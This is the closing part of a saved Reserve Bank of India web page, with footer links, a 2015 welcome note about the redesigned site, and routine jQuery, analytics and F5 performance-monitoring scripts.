                                            <p class="head">Press Release: 2023-2024/939</p>
                                            <br><br><br><br><br><br><br><br>
                                        </td>

                                    </tr>
                                </tbody>
                            </table>
                        </td>
                    </tr>

                </tbody>
            </table>
        </div>


        <div class="clearfix" bis_skin_checked="1"></div>
        <a href="https://www.rbi.org.in/Scripts/Error.aspx?aspxerrorpath=/CyberQuizzes/Quiz1.aspx#top"
            class="scrollToTop" id="backToTop">Top</a>
        <footer class="footer">
            <div class="footer" bis_skin_checked="1">
                <div class="container_12" bis_skin_checked="1">
                    <div class="grid_9" style="width:895px !important" bis_skin_checked="1">
                        <h4><span class="blue">More</span> Links </h4>
                        <div class="grid_2 alpha" style="width:150px !important" bis_skin_checked="1">
                            <ul class="footerlist">
                                <!--<li><a target="_blank" href="/Scripts/ExternalResearchSchemes.aspx">Research Portal</a></li>-->
                                <li><a target="_blank" href="https://www.rbi.org.in/FinancialEducation/">Financial
                                        Education</a></li>
                                <!--https://www.rbi.org.in/commonperson/English/Scripts/Home.aspx-->
                                <li><a target="_blank" href="https://ncfe.org.in/e-lms">E-LMS</a></li>
                                <li><a target="_blank" href="https://rbikehtahai.rbi.org.in/">RBI Kehta Hai</a></li>
                                <li><a href="https://www.rbi.org.in/Scripts/FAQDisplay.aspx">FAQs</a></li>
                                <!--<li><a href="/Scripts/Glossary.aspx">Glossary</a></li>-->
                                <li><a href="https://www.rbi.org.in/Scripts/IFSCMICRDetails.aspx">IFSC/MICR
                                        Codes</a>
                                </li>
                            </ul>
                        </div>
                        <div class="grid_2 omega" style="width:215px !important;" bis_skin_checked="1">
                            <ul class="footerlist">
                                <li><a href="https://www.rbi.org.in/Scripts/BS_ViewTenders.aspx">Tenders</a></li>
                                <li><a target="_blank"
                                        href="https://opportunities.rbi.org.in/scripts/index.aspx">Opportunities
                                        <font>@
                                        </font>RBI
                                    </a></li>
                                <li><a href="https://www.rbi.org.in/Scripts/HolidayMatrixDisplay.aspx">Bank
                                        Holidays</a>
                                </li>
                                <li><a href="https://www.rbi.org.in/Scripts/BS_ViewForms.aspx">Forms</a></li>

                            </ul>
                        </div>
                        <div class="grid_2 alpha omega" style="width:254px !important;" bis_skin_checked="1">
                            <ul class="footerlist">
                                <li><a href="https://www.rbi.org.in/Scripts/EventsDisplay.aspx">Events</a></li>
                                <!--<li><a href="/Scripts/PublicEngagement.aspx">Public Speaking Engagements</a></li>-->
                                <li><a href="https://www.rbi.org.in/Scripts/rbi_clarification.aspx">RBI
                                        Clarifications</a></li>
                                <li><a href="https://www.rbi.org.in/Scripts/Righttoinfoact.aspx">Right to
                                        Information
                                        Act</a></li>
                                <li><a href="https://www.rbi.org.in/Scripts/OtherLinks.aspx">Important Websites</a>
                                </li>
                                <!--<li><a href="/Scripts/OtherLinks.aspx">Related Links</a></li>-->
                                <li><a href="https://rbidocs.rbi.org.in/rdocs/content/pdfs/Utkarsh30122022.pdf">RBI's
                                        Core Purpose, Values and Vision</a></li>
                            </ul>
                        </div>
                        <div class="grid_2" style="width:215px !important;" bis_skin_checked="1">
                            <ul class="footerlist">

                                <li><a href="https://www.rbi.org.in/Scripts/CitiChart.aspx">Citizens' Charter</a>
                                </li>
                                <li><a href="https://www.rbi.org.in/Scripts/Timlines.aspx">Timelines for Regulatory
                                        Approvals</a></li>
                                <li><a href="https://www.rbi.org.in/Scripts/Complaints.aspx">Complaints</a></li>
                                <li><a href="https://shabdavali.rbi.org.in/">Banking Glossary</a></li>
                                <li><a href="https://www.rbi.org.in/Scripts/helpdesk.aspx">Contact Us</a></li>

                            </ul>
                        </div>
                    </div>
                    <div class="grid_3" style="width:135px !important" bis_skin_checked="1">
                        <h4><span class="blue">Follow</span> RBI </h4>
                        <ul class="footerlist">
                            <li><a href="https://www.rbi.org.in/Scripts/rss.aspx"><img src="./site/rss-icon.png"
                                        alt="Subscribe to RSS" class="rss">RSS</a></li>
                            <li><a href="https://twitter.com/RBI" target="_blank" class="twitter"><img
                                        src="./site/Twitter_Logo_Blue.png" width="22px" height="22px"
                                        alt="Follow RBI on Twitter" class="twitter">Twitter</a></li>
                            <!--<li><a href="https://www.youtube.com/channel/UCIfCOl43tunZVNYafeC4RQA" class="videos" target="_blank"><img src="/images/videos-icon.png" alt="Check RBI Videos" class="videos"/>Videos</a></li>-->
                            <li><a href="https://www.youtube.com/channel/UCIfCOl43tunZVNYafeC4RQA" class="videos"
                                    target="_blank"><img src="./site/youtube.png" alt="Check RBI Videos"
                                        class="videos">YouTube</a></li>
                            <li>
                                Download Mobile App<br>
                                <a href="https://play.google.com/store/apps/details?id=com.reservebankofindia.app"
                                    target="_blank"><img src="./site/Android.png" alt="Android App" class="rss"
                                        style="width:17px">Play Store</a><br>
                                <a href="https://apps.apple.com/us/app/reserve-bank-of-india/id1154394549?ls=1"
                                    target="_blank"><img src="./site/IOS.png" alt="Apple App" class="rss"
                                        style="width:18px;height:17px">App Store</a>
                            </li>

                        </ul>
                    </div>
                    <div class="clearfix" bis_skin_checked="1"></div>
                </div>
                <div class="copyright" bis_skin_checked="1">
                    <div class="container_12" bis_skin_checked="1">
                        <div class="grid_6 pull_left" bis_skin_checked="1">© Reserve Bank of India. All Rights
                            Reserved.
                        </div>
                        <div class="grid_5 pull_right" bis_skin_checked="1"><a
                                href="https://www.rbi.org.in/Scripts/sitemap.aspx">Sitemap</a> | <a
                                href="https://www.rbi.org.in/Scripts/Disclaimer.aspx">Disclaimer</a></div>
                        <div class="clearfix" bis_skin_checked="1"></div>
                    </div>
                </div>


                <!--Welcome note-->

                <div id="boxesWN" bis_skin_checked="1">
                    <div id="dialogWN" class="window" style="top:100px;" bis_skin_checked="1">
                        <div bis_skin_checked="1"> <img width="60" height="60" src="./site/Rbinote.jpeg" alt="Rbi note">
                        </div>
                        <table class="WelcomeNote">
                            <tbody>
                                <tr>
                                    <td style="float:right;">

                                        April 14, 2015
                                    </td>
                                </tr>
                                <tr>

                                    <td>

                                        Dear All
                                    </td>
                                </tr>
                                <tr>
                                    <td>

                                        Welcome to the refurbished site of the Reserve Bank of India.
                                    </td>

                                </tr>
                                <tr>
                                    <td>

                                        The two most important features of the site are: One, in addition to the
                                        default
                                        site, the refurbished site also has all the information bifurcated
                                        functionwise;
                                        two, a much improved search – well, at least we think so but you be the
                                        judge.
                                    </td>

                                </tr>

                                <tr>
                                    <td>
                                        With this makeover, we also take a small step into social media. We will now
                                        use
                                        Twitter (albeit one way) to send out alerts on the announcements we make and
                                        YouTube to place in public domain our press conferences, interviews of our
                                        top
                                        management, events, such as, town halls and of course, some films aimed at
                                        consumer literacy.
                                    </td>

                                </tr>
                                <tr>
                                    <td>
                                        The site can be accessed through most browsers and devices; it also meets
                                        accessibility standards.
                                    </td>
                                </tr>
                                <tr>
                                    <td>
                                        Please save the url of the refurbished site in your favourites as we will
                                        give
                                        up the existing site shortly and register or re-register yourselves for
                                        receiving RSS feeds for uninterrupted alerts from the Reserve Bank.
                                    </td>
                                </tr>
                                <tr>
                                    <td>
                                        Do feel free to give us your feedback by clicking on the feedback button on
                                        the
                                        right hand corner of the refurbished site.
                                    </td>
                                </tr>
                                <tr>
                                    <td>
                                        Thank you for your continued support.<br><br>
                                    </td>
                                </tr>
                                <tr>
                                    <td>
                                        <strong>
                                            Department of Communication <br>
                                            Reserve Bank of India</strong>

                                    </td>
                                </tr>
                                <tr>
                                    <td id="popupfootWN"><a <!--
                                            href="https://www.rbi.org.in/Scripts/Error.aspx?aspxerrorpath=/CyberQuizzes/Quiz1.aspx#"
                                            -->
                                            <!-- class="close agree" style="float:right">Next</a></td> -->
                                </tr>
                            </tbody>
                        </table>
                        <!-- <div id="popupfootWN"> <a href="#" class="close agree" style="float:right" >Next</a>    </div>--><!--<img src="../images/button_close.gif" alt="Close" class="close agree" />-->
                    </div>
                    <div id="maskWN" style="width:100% !important" bis_skin_checked="1"></div>

                    <!--<div id="feedbackbtn"><a href="#"><div align="center" class="feedbacktext">Feedback</div></a></div>-->

                </div>
            </div>
        </footer>
        <!--<script type="text/javascript" src="/js/URLchange.js"></script>-->
        <!-- For live comment out below line.-->

        <script src="./site/ReplaceURL.js.download" type="text/javascript"></script>
        <!-- <script src="./site/jquery.cookie.js.download" type="text/javascript"></script> -->
        <script type="text/javascript" language="javascript">


            //this is for floating TOP link

            $(document).ready(function () {

                var offset = 230;
                var duration = 500;


                jQuery(window).scroll(function () {
                    if (jQuery(this).scrollTop() > offset) {
                        jQuery('.scrollToTop').fadeIn(duration);
                        // $('#backToTop').css('right', (diffWidth / 2) - 6);
                    } else {
                        jQuery('.scrollToTop').fadeOut(duration);
                        //  $('#backToTop').css('right', (diffWidth / 2) - 6);
                    }
                });

                //        $('a[href*=#]:not([href=#])').click(function () {

                //            if (location.pathname.replace(/^\//, '') == window.location.pathname.replace(/^\//, '') && location.hostname == window.location.hostname) {

                //                var target = $(this.hash);
                //                target = target.length ? target : $('[name=' + this.hash.slice(1) + ']');
                //                if (target.length) {
                //                    $('html,body').animate({
                //                        scrollTop: target.offset().top
                //                    }, 800);
                //                    return false;
                //                }
                //            }
                //        });

                $('.scrollToTop').click(function () {
                    $('html, body').animate({ scrollTop: 0 }, 800);
                    return false;
                });
            });


            //Below code is for floating left panel and floating tree structure
            //first if condition is for functionwise pages and 2nd one for rest all
            $(window).scroll(function () {

                if ($('div.banner2').length) {

                    if ($(window).scrollTop() >= 265) {
                        $('#menubar').css("position", "fixed");
                        $('#menubar').css("width", "240px");
                        $('#menubar').css("margin-top", "-281px");
                        $('.content_area').css("margin-left", "252px");

                        $('.sidebar_nav').css("position", "fixed");
                        $('.sidebar_nav').css("margin-top", "-200px");
                        $('.sidebar_nav').css("width", "236px");


                        $('#DateSettree_lbltree').css('position', 'fixed');
                        $('#DateSettree_lbltree').css('margin-top', '-281px');

                    }

                    else {
                        $('#menubar').css("position", "");
                        $('#menubar').css("width", "");
                        $('#menubar').css("margin-top", "");
                        $('.content_area').css("margin-left", "");

                        $('.sidebar_nav').css("position", "");
                        $('.sidebar_nav').css("margin-top", "");
                        $('.sidebar_nav').css("width", "");



                        $('#DateSettree_lbltree').css('position', '');
                        $('#DateSettree_lbltree').css('margin-top', '');
                    }

                }

                else if ($(window).scrollTop() >= 185) {
                    $('#menubar').css("position", "fixed");
                    $('#menubar').css("width", "240px");
                    $('#menubar').css("margin-top", "-200px");
                    $('.content_area').css("margin-left", "252px");

                    $('.sidebar_nav').css("position", "fixed");
                    $('.sidebar_nav').css("margin-top", "-200px");
                    $('.sidebar_nav').css("width", "236px");


                    $('#DateSettree_lbltree').css('position', 'fixed');
                    $('#DateSettree_lbltree').css('margin-top', '-200px');

                }

                else {
                    $('#menubar').css("position", "");
                    $('#menubar').css("width", "");
                    $('#menubar').css("margin-top", "");
                    $('.content_area').css("margin-left", "");

                    $('.sidebar_nav').css("position", "");
                    $('.sidebar_nav').css("margin-top", "");
                    $('.sidebar_nav').css("width", "");


                    $('#DateSettree_lbltree').css('position', '');
                    $('#DateSettree_lbltree').css('margin-top', '');
                }
                //        if ($(window).scrollTop() >= 235) {

                //            $('#DateSettree_lbltree').css('height', '183px');
                //            $('#DateSettree_lbltree').css('overflow-y', 'scroll');
                //            $('#DateSettree_lbltree').css('width', '100px');

                //        }
                //        else {
                //            $('#DateSettree_lbltree').css('height', '');
                //            $('#DateSettree_lbltree').css('overflow-y', '');
                //            $('#DateSettree_lbltree').css('width', '');

                //        }


            });

            // $(window).unload(function () {
            //     $.cookies.del('feedback_Cookie'); 
            // });
            // $(document).ready(function () {


            //     $('.window .close').click(function (e) {
            //         //Cancel the link behavior
            //         e.preventDefault();
            //         $.cookie('feedback_Cookie', 'Yes', { expires: 365, path: '/' });
            //         $('#maskWN').hide();
            //         $('.window').hide();
            //         var scroll = $(window).scrollTop();
            //         $("html").scrollTop(scroll);
            //     });

            //     $('#maskWN').click(function () {
            //         $(this).hide();
            //         $.cookie('feedback_Cookie', 'Yes', { expires: 365, path: '/' });
            //         $('.window').hide();

            //     });

            //        if ($.cookie('feedback_Cookie') == null) {
            //            var id = '#dialog';

            //            //Get the screen height and width
            //            var maskHeight = $(document).height();
            //            var maskWidth = $(window).width();
            //           

            //            //Set heigth and width to mask to fill up the whole screen
            //            $('#mask').css({ 'width': '100%', 'height': '100%','position':'fixed' });

            //            //transition effect
            //            $('#mask').fadeIn(500);
            //            $('#mask').fadeTo("slow", 0.9);

            //            //Get the window height and width
            //            var winH = $(window).height();
            //            var winW = $(window).width();

            //            //Set the popup window to center
            //            $(id).css('top', winH / 2 - $(id).height() / 2);
            //            $(id).css('left', winW / 2 - $(id).width() / 2);

            //            //transition effect
            //            $(id).fadeIn(2000);



            //        }
            //        $('blockquote p').css('margin','auto');
            //        $('blockquote blockquote blockquote p').contents().contents().unwrap();
            //        $('blockquote blockquote blockquote').contents().unwrap();
            //        $('blockquote blockquote').contents().unwrap();
            //        $('blockquote').contents().unwrap();


            //if close button is clicked
            $('.window .close').click(function (e) {
                //Cancel the link behavior
                e.preventDefault();
                $.cookie('feedback_Cookie', 'Yes', { expires: 365, path: '/' });
                $('#mask').hide();
                $('.window').hide();
                var scroll = $(window).scrollTop();
                $("html").scrollTop(scroll);
            });

            //if mask is clicked
            $('#mask').click(function () {
                $(this).hide();
                $('.window').hide();
            });
            $('#feedbackbtn').click(function () {
                var id = '#dialog';

                //Get the screen height and width
                var maskHeight = $(document).height();
                var maskWidth = $(window).width();

                //Set heigth and width to mask to fill up the whole screen
                //$('#mask').css({ 'width': maskWidth, 'height': maskHeight });
                $('#mask').css({ 'width': '100%', 'height': '100%', 'position': 'fixed' });

                //transition effect
                $('#mask').fadeIn(500);
                $('#mask').fadeTo("slow", 0.9);

                //Get the window height and width
                var winH = $(window).height();
                var winW = $(window).width();

                //Set the popup window to center
                $(id).css('top', winH / 2 - $(id).height() / 2);
                $(id).css('left', winW / 2 - $(id).width() / 2);

                //transition effect
                $(id).fadeIn(2000);
            });

            $('.submit').click(function () {
                var Name = $("[id*=txtFeedbackName]").val();
                var Email = $("[id*=txtFeedbackEmail]").val();
                var Comments = $("[id*=txtFeedbackComments]").val();
                if (Name == "") {

                    alert("Please enter your name");
                    $("[id*=txtFeedbackName]").focus();
                    return false;
                }
                else if (Email == "") {
                    alert("Please enter your email");
                    $("[id*=txtFeedbackEmail]").focus();
                    return false;
                }
                else if (Email != "" && !ValidateEmail(Email)) {
                    alert("Please enter a valid email address");
                    $("[id*=txtFeedbackEmail]").focus();
                    return false;
                }

                else if (Comments == "") {

                    alert("Please enter some comments");
                    $("[id*=txtFeedbackComments]").focus();
                    return false;
                }

                else {
                    // $('[id*=Button1]').attr('disabled', 'disabled');

                    // var param = { Name: Name, EmailID: Email, Comments: Comments };
                    // $.ajax({
                    //     //type: "POST",
                    //     url: "../Home.aspx/SaveFeedback",
                    //     data: JSON.stringify(param),
                    //     contentType: "application/json; charset=utf-8",
                    //     dataType: "json",

                    //     success: function (response) {

                    //         if (response.d == "0") {
                    //             alert("Thank you for your feedback");
                    //             $.cookie('feedback_Cookie', 'Yes', { expires: 365, path: '/' });
                    //             $('#mask').hide();
                    //             $('.window').hide();
                    //             $('[id*=Button1]').removeAttr('disabled');
                    //             $("[id*=txtFeedbackName]").val("");
                    //             $("[id*=txtFeedbackEmail]").val("");
                    //             $("[id*=txtFeedbackComments]").val("");
                    //         }
                    //         else {
                    //             alert("Please try again");
                    //             $('[id*=Button1]').removeAttr('disabled');


                    //         }

                    //     }
                    // });
                }

            });

            function ValidateEmail(email) {
                var expr = /^([\w-\.]+)@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.)|(([\w-]+\.)+))([a-zA-Z]{2,4}|[0-9]{1,3})(\]?)$/;
                return expr.test(email);
            };

            //        $('#divArchiveMain').click(function () {
            //            
            //            if ($(window).scrollTop() >= 235) {

            //                $('#DateSettree_lbltree').css('height', '181px');
            //                $('#DateSettree_lbltree').css('overflow-y', 'scroll');
            //                $('#DateSettree_lbltree').css('width', '100px');

            //            }
            //            else {
            //                $('#DateSettree_lbltree').css('height', '');
            //                $('#DateSettree_lbltree').css('overflow-y', '');
            //                $('#DateSettree_lbltree').css('width', '');

            //            }
            //        });

            $('a.style1').each(function () {

                var $this = $(this);
                var aHref = $this.attr('class');
                $this.attr('class', aHref.replace('style1', 'links'));
            });
            });

        </script>
        <script type="text/javascript">
            (function (i, s, o, g, r, a, m) {
                i['GoogleAnalyticsObject'] = r; i[r] = i[r] || function () {
                    (i[r].q = i[r].q || []).push(arguments)
                }, i[r].l = 1 * new Date(); a = s.createElement(o),
                    m = s.getElementsByTagName(o)[0]; a.async = 1; a.src = g; m.parentNode.insertBefore(a, m)
            })(window, document, 'script', '//www.google-analytics.com/analytics.js', 'ga');

            ga('create', 'UA-61369961-1', 'auto');
            ga('send', 'pageview');

        </script>
    </form>


    <script type="text/javascript" src="./site/plugins.js.download"></script>
    <script type="text/javascript" src="./site/script.js.download"></script>
    <script id="f5_cspm">(function () {
            var f5_cspm = {
                f5_p: 'BDMKDIAKMDDBFPJKHGGKNMPEHJJMLFFIMODJEEIGDJALJIDGLDLGBBKJBLFFNCAOIPNBHPKCCHJFKIBJIGOADINDAANONPHIIFKCBKNJBKGKDKGGKAFAHOOMFABCDBNA', setCharAt: function (str, index, chr) { if (index > str.length - 1) return str; return str.substr(0, index) + chr + str.substr(index + 1); }, get_byte: function (str, i) { var s = (i / 16) | 0; i = (i & 15); s = s * 32; return ((str.charCodeAt(i + 16 + s) - 65) << 4) | (str.charCodeAt(i + s) - 65); }, set_byte: function (str, i, b) { var s = (i / 16) | 0; i = (i & 15); s = s * 32; str = f5_cspm.setCharAt(str, (i + 16 + s), String.fromCharCode((b >> 4) + 65)); str = f5_cspm.setCharAt(str, (i + s), String.fromCharCode((b & 15) + 65)); return str; }, set_latency: function (str, latency) { latency = latency & 0xffff; str = f5_cspm.set_byte(str, 40, (latency >> 8)); str = f5_cspm.set_byte(str, 41, (latency & 0xff)); str = f5_cspm.set_byte(str, 35, 2); return str; }, wait_perf_data: function () {
                    try {
                        var wp = window.performance.timing; if (wp.loadEventEnd > 0) {
                            var res = wp.loadEventEnd - wp.navigationStart; if (res < 60001) { var cookie_val = f5_cspm.set_latency(f5_cspm.f5_p, res); window.document.cookie = 'f5avr0888191084aaaaaaaaaaaaaaaa_cspm_=' + encodeURIComponent(cookie_val) + ';path=/'; }
                            return;
                        }
                    }
                    catch (err) { return; }
                    setTimeout(f5_cspm.wait_perf_data, 100); return;
                }, go: function () {
                    var chunk = window.document.cookie.split(/\s*;\s*/); for (var i = 0; i < chunk.length; ++i) {
                        var pair = chunk[i].split(/\s*=\s*/); if (pair[0] == 'f5_cspm' && pair[1] == '1234') { var d = new Date(); d.setTime(d.getTime() - 1000); window.document.cookie = 'f5_cspm=;expires=' + d.toUTCString() + ';path=/;'; setTimeout(f5_cspm.wait_perf_data, 100); }
                    }
                }
            }
            f5_cspm.go();
        }());</script>
    <ul id="ui-id-1" tabindex="0" class="ui-menu ui-widget ui-widget-content ui-autocomplete ui-front"
        style="top: 114px; left: 909px; width: 295px; display: none;">
        <li class="borderAutocomplete ui-menu-item"><a id="ui-id-22" tabindex="-1"
                class="ui-menu-item-wrapper">Agricultural Debt relief <span class="ui-state-highlight">scheme</span></a>
        </li>
        <li class="borderAutocomplete ui-menu-item"><a id="ui-id-23" tabindex="-1"
                class="ui-menu-item-wrapper">Agricultural Debt Waiver Debt Relief <span
                    class="ui-state-highlight">Scheme</span></a></li>
        <li class="borderAutocomplete ui-menu-item"><a id="ui-id-24" tabindex="-1"
                class="ui-menu-item-wrapper">Agricultural Debt Waiver <span class="ui-state-highlight">scheme</span></a>
        </li>
        <li class="borderAutocomplete ui-menu-item"><a id="ui-id-25" tabindex="-1" class="ui-menu-item-wrapper">Amount
                under Government <span class="ui-state-highlight">Scheme</span>s</a></li>
        <li class="borderAutocomplete ui-menu-item"><a id="ui-id-26" tabindex="-1" class="ui-menu-item-wrapper">bank
                investment <span class="ui-state-highlight">scheme</span>s of mutual funds</a></li>
        <li class="borderAutocomplete ui-menu-item"><a id="ui-id-27" tabindex="-1" class="ui-menu-item-wrapper">debt
                relief <span class="ui-state-highlight">scheme</span></a></li>
        <li class="borderAutocomplete ui-menu-item"><a id="ui-id-28" tabindex="-1" class="ui-menu-item-wrapper">Deposits
                And <span class="ui-state-highlight">Scheme</span>s Other</a></li>
        <li class="borderAutocomplete ui-menu-item"><a id="ui-id-29" tabindex="-1" class="ui-menu-item-wrapper">Direct
                Benefit Transfer under Government <span class="ui-state-highlight">Scheme</span>s</a></li>
        <li class="borderAutocomplete ui-menu-item"><a id="ui-id-30" tabindex="-1"
                class="ui-menu-item-wrapper">educational loan <span class="ui-state-highlight">scheme</span></a></li>
        <li class="borderAutocomplete ui-menu-item"><a id="ui-id-31" tabindex="-1" class="ui-menu-item-wrapper">FCNR B
                <span class="ui-state-highlight">scheme</span></a></li>
    </ul>
    <div role="status" aria-live="assertive" aria-relevant="additions" class="ui-helper-hidden-accessible"
        bis_skin_checked="1">
        <div bis_skin_checked="1" style="display: none;">10 results are available, use up and down arrow keys to
            navigate.</div>
        <div style="display: none;" bis_skin_checked="1">10 results are available, use up and down arrow keys to
            navigate.</div>
        <div bis_skin_checked="1" style="display: none;">10 results are available, use up and down arrow keys to
            navigate.</div>
        <div style="display: none;" bis_skin_checked="1">Agricultural Debt relief scheme</div>
        <div style="display: none;" bis_skin_checked="1">Agricultural Debt Waiver Debt Relief Scheme</div>
        <div style="display: none;" bis_skin_checked="1">Agricultural Debt Waiver scheme</div>
        <div style="display: none;" bis_skin_checked="1">Amount under Government Schemes</div>
        <div style="display: none;" bis_skin_checked="1">bank investment schemes of mutual funds</div>
        <div bis_skin_checked="1" style="display: none;">debt relief scheme</div>
        <div bis_skin_checked="1" style="display: none;">bank investment schemes of mutual funds</div>
        <div style="display: none;" bis_skin_checked="1">debt relief scheme</div>
        <div bis_skin_checked="1" style="display: none;">Deposits And Schemes Other</div>
        <div bis_skin_checked="1" style="display: none;">debt relief scheme</div>
        <div style="display: none;" bis_skin_checked="1">Deposits And Schemes Other</div>
        <div bis_skin_checked="1" style="display: none;">Direct Benefit Transfer under Government Schemes</div>
        <div style="display: none;" bis_skin_checked="1">educational loan scheme</div>
        <div style="display: none;" bis_skin_checked="1">FCNR B scheme</div>
        <div bis_skin_checked="1" style="display: none;">educational loan scheme</div>
        <div bis_skin_checked="1">Direct Benefit Transfer under Government Schemes</div>
    </div>
</body><grammarly-desktop-integration data-grammarly-shadow-root="true"><template shadowrootmode="open">
        <style>
            div.grammarly-desktop-integration {
                position: absolute;
                width: 1px;
                height: 1px;
                padding: 0;
                margin: -1px;
                overflow: hidden;
                clip: rect(0, 0, 0, 0);
                white-space: nowrap;
                border: 0;
                -moz-user-select: none;
                -webkit-user-select: none;
                -ms-user-select: none;
                user-select: none;
            }

            div.grammarly-desktop-integration:before {
                content: attr(data-content);
            }
        </style>
        <div aria-label="grammarly-integration" role="group" tabindex="-1" class="grammarly-desktop-integration"
            data-content="{&quot;mode&quot;:&quot;full&quot;,&quot;isActive&quot;:true,&quot;isUserDisabled&quot;:false}">
        </div>
    </template></grammarly-desktop-integration>

</html>